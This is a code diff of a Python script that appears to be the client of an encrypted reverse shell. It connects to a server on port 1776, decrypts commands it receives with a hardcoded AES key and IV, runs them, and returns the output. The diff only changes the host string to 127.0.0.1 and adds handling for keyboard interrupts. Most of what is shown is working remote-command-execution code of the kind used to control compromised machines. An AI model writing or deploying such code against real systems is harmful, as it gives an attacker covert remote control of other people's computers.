@@ -4,11 +4,12 @@ import socket
 import subprocess
 from Crypto.Cipher import AES
 
-host_server = 'localhost'
+host_server = '127.0.0.1'
 host_port = '1776'
 aes_key = '8ZT%a*SJxTD*f6#8C6BfpHmf#DcE5^qH'
 aes_iv = 'sPqapxT*4vZXjZ$w'
 aes_bs = 64
+
 
 def bit_pad(bs, message):
     return(message + (bs - len(message) % bs) * chr(bs - len(message) % bs))
@@ -71,14 +72,17 @@ def run_cmd(command, clientsocket):
 
 def main(server, port, key, iv, bs):
     clientsocket = connect_to_server(server, port)
-    while True:
-        operating_system = check_os()
-        data = clientsocket.recv(2048)
-        if len(data) > 0:
-            message = do_decrypt(key, iv, data)
-            command = message.decode('utf-8')
-            output = run_cmd(command, clientsocket)
-            send_message(clientsocket, output)
+    try:
+        while True:
+            operating_system = check_os()
+            data = clientsocket.recv(2048)
+            if len(data) > 0:
+                message = do_decrypt(key, iv, data)
+                command = message.decode('utf-8')
+                output = run_cmd(command, clientsocket)
+                send_message(clientsocket, output)
+    except KeyboardInterrupt:
+        print('Interrupted')
             
         
 if __name__ == '__main__':
